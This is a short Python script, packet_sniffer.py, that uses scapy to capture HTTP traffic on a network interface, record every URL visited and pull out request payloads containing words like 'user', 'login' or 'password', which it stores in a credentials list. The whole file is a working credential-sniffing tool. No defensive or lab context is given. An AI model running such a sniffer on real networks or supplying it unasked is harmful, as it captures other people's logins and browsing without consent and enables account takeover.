#! /usr/bin/env python
# packet_sniffer.py - packet sniffer that catches HTTP packets and filters out
# all URLs visited and payloads associated with login information.
# Compatibility: Python 3.x

import scapy.all
from scapy.layers.http import HTTPRequest
from scapy.sendrecv import AsyncSniffer


def get_url(packet):
    return (packet[HTTPRequest].Host + packet[HTTPRequest].Path).decode(errors="ignore")


def get_login_info(packet):
    if packet.haslayer(scapy.all.Raw):
        load = packet[scapy.all.Raw].load.decode(errors="ignore")
        keywords = ["user", "usr", "name", "login", "mail",
                    "password", "pass", "pwd"]
        if any(keyword in load.lower() for keyword in keywords):
            return load


class PacketSniffer:
    def __init__(self, interface="eth0"):
        self.console_output = []
        self.credentials = []
        self.async_sniffer = AsyncSniffer(iface=interface, store=False, prn=self.process_sniffed_packet)

    def process_sniffed_packet(self, packet):
        if packet.haslayer(HTTPRequest):
            url = get_url(packet)
            self.console_output.append(url)
            login_info = get_login_info(packet)
            if login_info:
                self.console_output.append("[LOGIN INFO]: " + login_info)
                self.credentials.append(login_info)

    def start_sniffer(self):
        self.async_sniffer.start()

    def stop_sniffer(self):
        self.async_sniffer.stop()

    def is_running(self):
        return self.async_sniffer.running
